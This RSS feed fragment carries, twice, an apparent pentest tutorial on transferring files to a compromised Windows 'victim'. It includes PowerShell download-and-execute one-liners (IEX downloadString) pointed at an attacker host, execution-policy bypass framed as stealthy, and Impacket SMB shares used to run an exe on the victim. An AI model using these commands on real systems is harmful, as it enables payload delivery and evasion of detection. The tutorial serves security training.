&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IEX(New&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Object&lt;/span&gt; Net&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WebClient)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;downloadString(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;getting-files-through-powershell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nBHrLvu-D9RNlMsbTG3Wsg.jpeg&#34; alt=&#34;&#34;  /&gt;

Getting Files Through PowerShell&lt;/h1&gt;
&lt;p&gt;On your Kali Linux machine, make a copy of the file you want to send to &lt;code&gt;/var/www/html/&lt;/code&gt; . On the Window’s machine, execute the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.10.128/unko.txt&amp;#39;,&amp;#39;C:\Users\Administrator\Desktop&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ransferme.txt&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.119.146/gori.ps1&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-withsmb&#34;&gt;File Transfer With SMB&lt;/h1&gt;
&lt;h2 id=&#34;method-1&#34;&gt;Method 1&lt;/h2&gt;
&lt;p&gt;Get &lt;code&gt;smbserver.py&lt;/code&gt;from &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt; and run the following on your Kali Linux machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbserver.py gori $(pwd) -smb2support -user gori -pass gorigori
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;New-PSDrive -Name &amp;#34;gori&amp;#34; -PSProvider &amp;#34;FileSystem&amp;#34; -gori &amp;#34;\\&amp;lt;YOUR IP&amp;gt;\gori&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;method-2&#34;&gt;Method 2&lt;/h2&gt;
&lt;p&gt;Run this on your Kali machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbserver.py kali .
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;On victim&amp;#39;s \\&amp;lt;YOUR IP ADDRESS&amp;gt;\kali\FILE\_NAME.exe &amp;#34;whoami&amp;#34; # &amp;#34;whoami&amp;#34; confirms that it is running
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-with-an-httpserver&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*i6K6JFM5TTxSFf4b_ermuQ.png&#34; alt=&#34;&#34;  /&gt;

File Transfer With an HTTP Server&lt;/h1&gt;
&lt;p&gt;On your machine run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m http.server 80
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://&amp;lt;YOUR IP&amp;gt;/path/to/file.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;file-transfer-with-scp-andrsync&#34;&gt;File Transfer with SCP and RSYNC&lt;/h1&gt;
&lt;p&gt;Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp username@ip_address:/home/username/filename
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scp filename username@ip_address:/home/username
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The same commands can be used with RYSNC by simply replacing &lt;code&gt;scp&lt;/code&gt; with &lt;code&gt;rsync&lt;/code&gt; .&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rsync &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*HNC0lT4gPMDU8uH0fyjRyw.png" alt=""  />
</p>
<h1 id="foreword">Foreword</h1>
<p>To avoid detection, it is best to use tools that are native to the victim’s computer.</p>
<h1 id="ftp-with-windowshost">FTP with Windows Host</h1>
<p>While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt-get install vsftpd  
</span></span><span style="display:flex;"><span>sudo service vsftpd start  
</span></span><span style="display:flex;"><span>service vsftpd status #status should be active
</span></span></code></pre></div><p>To check if your server is working, type <code>ftp localhost.</code> If you see the message “Connected to localhost”, your FTP server is running.</p>
<h2 id="accessing-file-with-interactive-shell"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*ehYiaPXjraslOYhNqIv7Zw.png" alt=""  />

Accessing File With Interactive Shell</h2>
<p>If you have an interactive shell on the Windows machine, run this command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cscript wget.vbs http://&lt;YOUR IP&gt;/&lt;PATH TO FILE&gt; &lt;FILENAME TO SAVE AS&gt;
</span></span></code></pre></div><h2 id="accessing-file-with-non-interactive-shell">Accessing File With Non-Interactive Shell</h2>
<p>If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>storageDir <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>pwd <span style="color:#f92672">&gt;</span> wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>webclient <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span><span style="color:#a6e22e">Object</span> System<span style="color:#f92672">.</span>Net<span style="color:#f92672">.</span>WebClient <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&lt;YOUR IP&gt;/&lt;PATH TO FILE&gt;&#34;</span> <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output-file.exe&#34;</span> <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1  
</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">$</span>webclient<span style="color:#f92672">.</span>DownloadFile(<span style="color:#f92672">$</span>url,<span style="color:#f92672">$</span>file) <span style="color:#f92672">&gt;&gt;</span>wget<span style="color:#f92672">.</span>ps1
</span></span></code></pre></div><p>To invoke<code>wget.ps1</code>, call</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>-ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://&lt;YOUR IP&gt;/&lt;FILENAME&gt;&#39;)&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>IEX(New<span style="color:#f92672">-</span><span style="color:#a6e22e">Object</span> Net<span style="color:#f92672">.</span>WebClient)<span style="color:#f92672">.</span>downloadString(<span style="color:#e6db74">&#39;http://&lt;YOUR IP&gt;/&lt;FILENAME&gt;&#39;</span>)
</span></span></code></pre></div><h1 id="getting-files-through-powershell"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*nBHrLvu-D9RNlMsbTG3Wsg.jpeg" alt=""  />

Getting Files Through PowerShell</h1>
<p>On your Kali Linux machine, make a copy of the file you want to send to <code>/var/www/html/</code> . On the Window’s machine, execute the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.10.128/unko.txt&#39;,&#39;C:\Users\Administrator\Desktop</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">ransferme.txt&#39;)&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>powershell <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.146/gori.ps1&#39;)&#34;</span>
</span></span></code></pre></div><h1 id="file-transfer-withsmb">File Transfer With SMB</h1>
<h2 id="method-1">Method 1</h2>
<p>Get <code>smbserver.py</code>from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> and run the following on your Kali Linux machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbserver.py gori $(pwd) -smb2support -user gori -pass gorigori
</span></span></code></pre></div><p>Run this on the victim’s machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>New-PSDrive -Name &#34;gori&#34; -PSProvider &#34;FileSystem&#34; -gori &#34;\\&lt;YOUR IP&gt;\gori&#34;
</span></span></code></pre></div><h2 id="method-2">Method 2</h2>
<p>Run this on your Kali machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>smbserver.py kali .
</span></span></code></pre></div><p>Run this on the victim’s machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>On victim&#39;s \\&lt;YOUR IP ADDRESS&gt;\kali\FILE\_NAME.exe &#34;whoami&#34; # &#34;whoami&#34; confirms that it is running
</span></span></code></pre></div><h1 id="file-transfer-with-an-httpserver"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*i6K6JFM5TTxSFf4b_ermuQ.png" alt=""  />

File Transfer With an HTTP Server</h1>
<p>On your machine run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python3 -m http.server 80
</span></span></code></pre></div><p>This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget http://&lt;YOUR IP&gt;/path/to/file.txt
</span></span></code></pre></div><h1 id="file-transfer-with-scp-andrsync">File Transfer with SCP and RSYNC</h1>
<p>Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp &lt;SOURCE&gt; &lt;DESTINATION&gt;
</span></span></code></pre></div><p>In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp username@ip_address:/home/username/filename
</span></span></code></pre></div><p>If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>scp filename username@ip_address:/home/username
</span></span></code></pre></div><p>The same commands can be used with RYSNC by simply replacing <code>scp</code> with <code>rsync</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>rsync &lt;SOURCE&gt; &lt;DESTINATION&gt;
</span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
<p>There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.</p>
]]></content:encoded>
    </item>
  </channel>
</rss>
